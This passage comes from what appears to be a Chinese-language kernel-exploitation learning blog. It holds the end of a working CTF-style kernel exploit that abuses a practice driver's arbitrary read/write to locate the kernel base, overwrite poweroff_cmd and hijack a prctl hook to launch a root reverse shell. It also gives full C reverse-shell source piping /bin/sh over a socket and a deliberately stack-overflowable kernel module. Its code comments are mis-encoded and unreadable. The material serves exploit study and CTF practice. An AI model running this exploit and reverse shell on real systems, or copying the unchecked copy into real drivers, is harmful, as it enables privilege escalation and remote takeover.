class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//open Dev</span></span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="string">&quot;/dev/arbWriteModule&quot;</span>;</span><br><span class="line">    devFD = openDev(pos);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// //set comm[TASK_COMM_LEN]</span></span><br><span class="line">    <span class="comment">// char target[16];</span></span><br><span class="line">    <span class="comment">// strcpy(target,&quot;tryToFindPIG007&quot;);</span></span><br><span class="line">    <span class="comment">// prctl(PR_SET_NAME,target);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> gettimeofday_str_offset = get_gettimeofday_str_offset();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>,gettimeofday_str_offset);</span><br><span class="line">   <span class="keyword">size_t</span> vdso_addr = <span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">size_t</span> addr=<span class="number">0xffffffff80000000</span>;addr &lt; <span class="number">0xffffffffffffefff</span>;addr += <span class="number">0x1000</span>) &#123;</span><br><span class="line">      <span class="comment">//è¯»å–ä¸€é¡µæ•°æ®</span></span><br><span class="line">      arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">      <span class="comment">//å¦‚æœåœ¨å¯¹åº”çš„åç§»å¤„ï¼Œæ­£å¥½æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ç¡®å®šå½“å‰å°±æ˜¯vdsoçš„åœ°å€</span></span><br><span class="line">      <span class="comment">//ä¹‹æ‰€ä»¥èƒ½ç¡®å®šï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ¯æ¬¡è¯»å–äº†0x1000å­—èŠ‚æ•°æ®ï¼Œä¹Ÿå°±æ˜¯1é¡µï¼Œè€Œvdsoçš„æ˜ å°„ä¹Ÿåªæ˜¯1é¡µ</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf+gettimeofday_str_offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;[+]find vdso.so!!\n&quot;</span>);</span><br><span class="line">         vdso_addr = addr;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;[+]vdso in kernel addr=0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (vdso_addr == <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]can&#x27;t find vdso.so!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è®¡ç®—å‡ºkernelåŸºåœ°å€</span></span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = vdso_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="keyword">size_t</span> poweroff_cmd_addr = kernel_base + POWEROFF_CMD;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]poweroff_cmd_addr=0x%lx\n&quot;</span>,poweroff_cmd_addr);</span><br><span class="line">    <span class="keyword">size_t</span> orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]orderly_poweroff_addr=0x%lx\n&quot;</span>,orderly_poweroff_addr);</span><br><span class="line">    <span class="keyword">size_t</span> prctl_hook_addr = kernel_base + PRCTL_HOOK;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]prctl_hook_addr=0x%lx\n&quot;</span>,prctl_hook_addr);</span><br><span class="line">    <span class="comment">//åå¼¹shellï¼Œæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”±call_usermodehelperæ¥æ‰§è¡Œï¼Œè‡ªå¸¦root</span></span><br><span class="line">    <span class="keyword">char</span> reverse_command[] = <span class="string">&quot;/reverse_shell&quot;</span>;</span><br><span class="line">    <span class="comment">//ä¿®æ”¹poweroff_cmd_addrå¤„çš„å­—ç¬¦ä¸²ä¸ºæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line">    arbitrary_write(devFD,<span class="built_in">strlen</span>(reverse_command),reverse_command,poweroff_cmd_addr);</span><br><span class="line">    <span class="comment">//hijack prctlï¼Œä½¿å¾—task_prctlæŒ‡å‘orderly_poweroffå‡½æ•°</span></span><br><span class="line">    arbitrary_write(devFD,<span class="number">0x8</span>,&amp;orderly_poweroff_addr,prctl_hook_addr);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123; <span class="comment">//forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ¥è§¦å‘shellçš„åå¼¹</span></span><br><span class="line">        prctl(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]open a shell\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;nc -lvnp 7777&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open %s...\n&quot;</span>,pos);</span><br><span class="line">    <span class="keyword">if</span> ((devFD = open(pos, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: %s\n&quot;</span>,pos);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> devFD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–vdsoé‡Œçš„å­—ç¬¦ä¸²&quot;gettimeofday&quot;ç›¸å¯¹vdso.soçš„åç§»</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="comment">//è·å–å½“å‰ç¨‹åºçš„vdso.soåŠ è½½åœ°å€0x7ffxxxxxxxx</span></span><br><span class="line">   <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">   <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span> (!vdso_addr) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//ä»…éœ€è¦æœç´¢1é¡µå¤§å°å³å¯ï¼Œå› ä¸ºvdsoæ˜ å°„å°±ä¸€é¡µ0x1000</span></span><br><span class="line">   <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">   <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arbWriteObj.len = len;</span><br><span class="line">    arbWriteObj.data = buf;</span><br><span class="line">    arbWriteObj.addr = addr;</span><br><span class="line">    ioctl(devFD,<span class="number">111</span>,&amp;arbWriteObj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arbWriteObj.len = len;</span><br><span class="line">    arbWriteObj.data = buf;</span><br><span class="line">    arbWriteObj.addr = addr;</span><br><span class="line">    ioctl(devFD,<span class="number">222</span>,&amp;arbWriteObj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="åå¼¹Shell"   >
          <a href="#åå¼¹Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå¼¹Shell" class="headerlink" title="åå¼¹Shell"></a>åå¼¹Shell</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//system(&quot;chmod 777 /flag&quot;);</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sockfd,numbytes;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">their_addr</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;break!&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((sockfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>)) == <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We get the sockfd~\n&quot;</span>);</span><br><span class="line">    their_addr.sin_family = AF_INET;</span><br><span class="line">    their_addr.sin_port = htons(<span class="number">7777</span>);</span><br><span class="line">    their_addr.sin_addr.s_addr=inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    bzero(&amp;(their_addr.sin_zero), <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(connect(sockfd,(struct sockaddr*)&amp;their_addr,<span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">0</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">2</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æˆ–è€…ç›´æ¥<code>system(&quot;chmod 777 /flag&quot;);</code>ä¹Ÿæ˜¯è·å–flagçš„ä¸€ç§æ–¹å¼ã€‚</p>
<p>â–²vdsoçš„åŠ«æŒä¸€ç›´æ²¡æœ‰å¤ç°æˆåŠŸè¿‡ï¼Œæ˜æ˜å·²ç»åŠ«æŒgettimeofdayå‡½æ•°çš„å†…å®¹ä¸ºshellcodeï¼Œç„¶åä¹ŸæŒ‚è½½äº†å¾ªç¯è°ƒç”¨gettimeofdayçš„ç¨‹åºï¼Œä½†æ˜¯å°±æ˜¯è¿è¡Œä¸äº†shellcodeã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204319#h3-12" >Kernel Pwn å­¦ä¹ ä¹‹è·¯ - ç•ªå¤– - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/07994f8b2bb0" >https://www.jianshu.com/p/07994f8b2bb0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104695399" >https://blog.csdn.net/seaaseesa/article/details/104695399</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/09/06/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E4%BA%8C)/">pwnKernelä»0å¼€å§‹(äºŒ)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-09-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-11-02</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>å…ˆå°è¯•ä¸‹æœ€ç®€å•çš„æ ˆæº¢å‡ºï¼Œä¿æŠ¤å’Œæœªè¢«ä¿æŠ¤çš„æƒ…å†µ</p>
<p>ç»™å‡ºè‡ªå·±è®¾è®¡çš„æ ˆæº¢å‡ºé¢˜ç›®ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *buffer_var;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">devClass</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> stack_dev_no;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">stack_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">loff_t</span> *f_pos)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">stack_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *f_pos)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">stack_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// static int stack_open(struct inode *i, struct file *f)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   printk(KERN_INFO &quot;[i] Module vuln: open()\n&quot;);</span></span><br><span class="line"><span class="comment">//   return 0;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// static int stack_close(struct inode *i, struct file *f)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   printk(KERN_INFO &quot;[i] Module vuln: close()\n&quot;);</span></span><br><span class="line"><span class="comment">//   return 0;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">stack_fops</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">                .owner = THIS_MODULE,</span><br><span class="line">                <span class="comment">// .open = stack_open,</span></span><br><span class="line">                <span class="comment">// .release = stack_close,</span></span><br><span class="line">                .write = stack_write,</span><br><span class="line">                .read = stack_read</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buffer_var=kmalloc(<span class="number">100</span>,GFP_DMA);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module stack registered&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;stack_dev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;stack&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((devClass = class_create(THIS_MODULE, <span class="string">&quot;chardrv&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(devClass, <span class="literal">NULL</span>, stack_dev_no, <span class="literal">NULL</span>, <span class="string">&quot;stack&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[i] Module stack error&quot;</span>);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;cdev, &amp;stack_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;cdev, stack_dev_no, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(devClass, stack_dev_no);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n&quot;</span>, MAJOR(stack_dev_no), MINOR(stack_dev_no));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·</span></span><br><span class="line">    unregister_chrdev_region(stack_dev_no, <span class="number">1</span>);</span><br><span class="line">    cdev_del(&amp;cdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»è®¾å¤‡</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">stack_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Stack_read function&quot;</span> );</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer_var)&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[i] Module vuln read: %s\n&quot;</span>, buffer_var);</span><br><span class="line">        kfree(buffer_var);</span><br><span class="line">        buffer_var=kmalloc(<span class="number">100</span>,GFP_DMA);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™è®¾å¤‡</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">stack_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Stack_write function&quot;</span> );</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (_copy_from_user(buffer, buf, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    buffer[len<span class="number">-1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    printk(<span class="string">&quot;[i] Module stack write: %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">strncpy</span>(buffer_var,buffer,len);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span 